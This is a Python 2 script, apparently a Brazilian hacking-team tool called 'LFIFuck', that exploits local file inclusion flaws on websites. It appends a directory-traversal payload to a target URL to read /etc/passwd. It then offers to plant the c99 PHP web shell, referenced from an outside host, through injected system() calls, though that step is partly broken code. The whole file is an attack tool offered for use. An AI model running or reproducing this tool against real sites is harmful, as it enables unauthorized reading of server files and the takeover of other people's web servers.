#!/usr/bin/python
#Ferramenta para exploracao com falhas de Local File Include (LFI)
#LFIFuck
#Desenvolvido por SR.ST0RM
#ASG TEAM

try:
	import webbrowser
	import requests
	import platform
	import time
	import sys
	import os
	import re

	so = platform.system()

	if so != "Linux":
		os.system("cls")
	if so != "Windows":
		os.system("clear")

except ImportError: 
	print "[!] Erro! Necessario a biblioteca requests..."
	print "[!] easy_install.py requests"

def help():
	print "*************************************************************"
	print '\033[01;32m'+'***	lfifuck.py  --url www.site.com/index.php?file=     ***'+'\033[0;0m'
	print "*************************************************************"

try:
	argumento = sys.argv

	if len(argumento) > 3:
		help()

	if argumento[1] == "--url":
		site = argumento[2]

	else:
		help()

except IndexError:
	banner = """ 
		 
 /$$       /$$$$$$$$ /$$$$$$       /$$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$
| $$      | $$_____/|_  $$_/      | $$_____/| $$  | $$ /$$__  $$| $$  /$$/
| $$      | $$        | $$        | $$      | $$  | $$| $$  \__/| $$ /$$/ 
| $$      | $$$$$     | $$        | $$$$$   | $$  | $$| $$      | $$$$$/  
| $$      | $$__/     | $$        | $$__/   | $$  | $$| $$      | $$  $$  
| $$      | $$        | $$        | $$      | $$  | $$| $$    $$| $$\  $$ 
| $$$$$$$$| $$       /$$$$$$      | $$      |  $$$$$$/|  $$$$$$/| $$ \  $$
|________/|__/      |______/      |__/       \______/  \______/ |__/  \__/
                                                                          
                                                                          
                                                                          

			   LFI exploiting tool             
        	     Desenvolvido por SR.STORM
       		lfifuck.py --help | Para mais informacoes
                            """
    	print banner
try:

	payload = "../../../../../../../../../../../../../../../etc/passwd"
	lfi = site+payload
	r = requests.get("http://"+lfi)
	html = r.text

	if r.status_code == 200:
		print "[/] SITE parece ser vulneravel...\n"
		
		if re.search(r"root:x",html):
			print "[!] SITE : Vulneravel..."
			time.sleep(1)
			print "\n[*] PAYLOAD : ADICIONADO : "
			print ""
			print "[1] Abrir browser no payload"
			print "[2] Instalar alguma shell no site\n"	

			opt = raw_input("O que deseja fazer? ")	

			if opt == "1":
				abrir = webbrowser.open(lfi)
			
			if opt == "2":
				shell_link = '<?php%20system("http://www.c99php.com/shell/c99.txt");?>'
				r = requests.get("http://"+site+shell_link)
				move = '<?php%20system("mv%20c99.txt%20c99.php");?>'
				rname = requests.get("http://"+site+move)
				code = rname.text
				
				if re.search(r"c99",code):
					print "\n[!] SHELL : Adicionada "
				else:
					print "\n[!] SHELL : Nao adicionada... Erro no payload!"
		else:
			print '\033[05;32m'+'[!] SITE : Nao vulneravel'+'\033[0;0m'

except requests.exceptions.ConnectionError:
	print '\033[05;32m'+'[!] SITE : Nao vulneravel'+'\033[0;0m'
except KeyboardInterrupt:
	print "[!]ATÉ MAIS!"
except NameError:
	print ""